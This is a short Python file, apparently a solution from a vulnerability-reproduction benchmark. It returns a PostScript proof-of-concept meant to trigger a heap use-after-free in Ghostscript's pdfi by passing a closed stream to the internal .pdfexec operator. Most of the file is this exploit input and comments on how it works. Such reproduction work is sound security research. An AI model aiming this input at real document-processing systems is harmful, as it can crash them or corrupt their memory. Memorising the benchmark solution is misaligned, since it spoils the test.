import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in pdfi.
        The vulnerability (arvo:42280 / Bug 707051) is triggered when the pdfi input stream
        initialization fails (e.g., via a closed or invalid stream), but the context is subsequently used.
        """
        
        # The PoC is a PostScript file that:
        # 1. Accesses the internal .pdfexec operator (entry point for pdfi).
        # 2. Creates a stream object that is closed, ensuring pdfi_set_input_stream fails.
        # 3. Invokes .pdfexec with this stream, triggering the vulnerable error path and subsequent UAF.
        
        poc = b"""%!PS
{
  % Access the system internal dictionary (key 1183615869) to find .pdfexec
  1183615869 internaldict /.pdfexec known {
    % Create a dummy file stream
    /s (%stdin) (r) file def
    % Close the stream immediately. Passing a closed stream causes 
    % pdfi_set_input_stream to fail, which is the prerequisite for this bug.
    s closefile
    
    % Invoke .pdfexec. The signature is typically: stream dict .pdfexec
    % We pass an empty dictionary and our closed stream.
    s << >> 1183615869 internaldict /.pdfexec get exec
  } if
} stopped
quit
"""
        return poc